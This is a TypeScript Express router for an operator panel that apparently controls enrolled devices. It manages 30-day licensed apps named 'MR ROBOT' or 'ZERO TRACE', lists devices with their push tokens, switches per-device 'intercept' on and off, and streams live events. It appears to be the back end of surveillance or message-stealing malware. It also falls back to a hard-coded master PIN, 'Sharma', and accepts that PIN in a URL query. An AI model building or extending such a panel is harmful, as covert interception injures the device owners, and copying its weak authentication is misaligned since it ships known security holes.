import { Router, type IRouter, type Request, type Response, type NextFunction } from "express";
import { localDb } from "../lib/local-db";
import { pool } from "../lib/db";
import { interceptState } from "../lib/intercept";
import { masterSseSubscribe, masterSseUnsubscribe } from "../lib/sse";

const router: IRouter = Router();

const DEFAULT_MASTER_PIN = process.env["MASTER_PIN"] ?? "Sharma";

async function getMasterPin(): Promise<string> {
  // Env var overrides DB — set MASTER_PIN on VPS to lock it
  if (process.env["MASTER_PIN"]) return process.env["MASTER_PIN"];
  const result = await pool.query<{ value: string }>(
    `SELECT value FROM settings WHERE key = 'master_pin'`
  );
  return result.rows[0]?.value ?? DEFAULT_MASTER_PIN;
}

async function requireMasterPin(req: Request, res: Response, next: NextFunction): Promise<void> {
  const pin = req.headers["x-master-pin"] as string | undefined;
  if (!pin) { res.status(401).json({ error: "Master PIN required" }); return; }
  const stored = await getMasterPin();
  if (pin !== stored) { res.status(401).json({ error: "Invalid master PIN" }); return; }
  next();
}

function stripPin<T extends { pin?: unknown; deleteProtectionPin?: unknown }>(obj: T) {
  const { pin: _p, deleteProtectionPin: _dp, ...rest } = obj;
  return rest;
}

const VALIDITY_DAYS = 30;

function isExpired(createdAt: string): boolean {
  return Date.now() > new Date(createdAt).getTime() + VALIDITY_DAYS * 24 * 60 * 60 * 1000;
}

router.post("/admin/verify-master-pin", async (req, res) => {
  const { pin } = req.body as { pin?: string };
  if (!pin) { res.status(400).json({ error: "PIN required" }); return; }
  const stored = await getMasterPin();
  if (pin !== stored) { res.status(401).json({ error: "Wrong master PIN" }); return; }
  res.json({ ok: true });
});

router.patch("/admin/master-pin", async (req, res) => {
  const { currentPin, newPin } = req.body as { currentPin?: string; newPin?: string };
  if (!currentPin || !newPin) { res.status(400).json({ error: "currentPin and newPin required" }); return; }
  const stored = await getMasterPin();
  if (currentPin !== stored) { res.status(401).json({ error: "Wrong current PIN" }); return; }
  if (newPin.length < 4) { res.status(400).json({ error: "New PIN must be at least 4 characters" }); return; }
  await pool.query(
    `INSERT INTO settings (key, value) VALUES ('master_pin', $1) ON CONFLICT (key) DO UPDATE SET value = $1`,
    [newPin]
  );
  res.json({ ok: true });
});

router.get("/master/apps", requireMasterPin, async (_req, res) => {
  const rows = await localDb.listApps();
  res.json(rows.map(app => ({
    ...stripPin(app),
    isExpired: isExpired(app.createdAt),
  })));
});

router.post("/master/apps", requireMasterPin, async (req, res) => {
  const { appId, name, pin, status } = req.body as { appId?: string; name?: string; pin?: string; status?: string };
  if (!appId || !name) { res.status(400).json({ error: "appId and name are required" }); return; }
  if (!["MR ROBOT", "ZERO TRACE"].includes(name.trim())) { res.status(400).json({ error: "App name must be 'MR ROBOT' or 'ZERO TRACE'" }); return; }
  try {
    const row = await localDb.createApp({ appId, name: name.trim(), pin, status });
    res.status(201).json(stripPin(row));
  } catch (err) {
    if ((err as Error).message === "APP_EXISTS") { res.status(409).json({ error: "App ID already exists" }); return; }
    throw err;
  }
});

router.get("/master/apps/:appId", requireMasterPin, async (req, res) => {
  const appId = String(req.params.appId ?? "");
  const app = await localDb.getApp(appId);
  if (!app) { res.status(404).json({ error: "App not found" }); return; }
  res.json({ ...stripPin(app), isExpired: isExpired(app.createdAt) });
});

router.patch("/master/apps/:appId", requireMasterPin, async (req, res) => {
  const appId = String(req.params.appId ?? "");
  const { name, pin, status } = req.body as { name?: string; pin?: string; status?: string };
  const updates: { name?: string; pin?: string; status?: string } = {};
  if (name !== undefined) updates.name = name;
  if (pin !== undefined) updates.pin = pin;
  if (status !== undefined) updates.status = status;
  if (Object.keys(updates).length === 0) { res.status(400).json({ error: "No fields to update" }); return; }
  const row = await localDb.updateApp(appId, updates);
  if (!row) { res.status(404).json({ error: "App not found" }); return; }
  res.json(stripPin(row));
});

router.delete("/master/apps/:appId", requireMasterPin, async (req, res) => {
  const appId = String(req.params.appId ?? "");
  const row = await localDb.deleteApp(appId);
  if (!row) { res.status(404).json({ error: "App not found" }); return; }
  res.json({ ok: true });
});

router.post("/master/apps/:appId/renew", requireMasterPin, async (req, res) => {
  const appId = String(req.params.appId ?? "");
  const app = await localDb.getApp(appId);
  if (!app) { res.status(404).json({ error: "App not found" }); return; }
  const THIRTY_MS = VALIDITY_DAYS * 24 * 60 * 60 * 1000;
  const oldExpiry = new Date(app.createdAt).getTime() + THIRTY_MS;
  const isExp = oldExpiry < Date.now();
  const newCreatedAt = new Date(isExp ? Date.now() : oldExpiry).toISOString();
  await pool.query(`UPDATE apps SET created_at = $1 WHERE app_id = $2`, [newCreatedAt, appId]);
  const updated = await localDb.getApp(appId);
  res.json(updated ? stripPin(updated) : stripPin(app));
});

router.get("/master/events", async (req, res) => {
  const pin = req.query["pin"] as string | undefined;
  const stored = await getMasterPin();
  if (!pin || pin !== stored) { res.status(401).json({ error: "Invalid master PIN" }); return; }
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();
  res.write(":ping\n\n");
  masterSseSubscribe(res);
  const keepAlive = setInterval(() => {
    try { res.write(":ping\n\n"); } catch { clearInterval(keepAlive); }
  }, 20000);
  req.on("close", () => { clearInterval(keepAlive); masterSseUnsubscribe(res); });
});

router.get("/master/intercept", requireMasterPin, async (_req, res) => {
  res.json(await interceptState.list());
});

router.post("/master/intercept/:deviceId", requireMasterPin, async (req, res) => {
  const deviceId = String(req.params.deviceId ?? "");
  if (!deviceId) { res.status(400).json({ error: "deviceId required" }); return; }
  await interceptState.enable(deviceId);
  res.json({ ok: true, intercepted: true });
});

router.delete("/master/intercept/:deviceId", requireMasterPin, async (req, res) => {
  const deviceId = String(req.params.deviceId ?? "");
  await interceptState.disable(deviceId);
  res.json({ ok: true, intercepted: false });
});

router.get("/master/all-devices", requireMasterPin, async (req, res) => {
  const hasFcm = req.query["hasFcm"] === "1";
  const appId = req.query.appId ? String(req.query.appId) : undefined;
  const rows = await localDb.listDevices({ appId });
  const result = hasFcm ? rows.filter(d => d.fcmToken) : rows;
  res.json(result.map(d => ({ ...d, hasFcm: !!d.fcmToken })));
});

export default router;
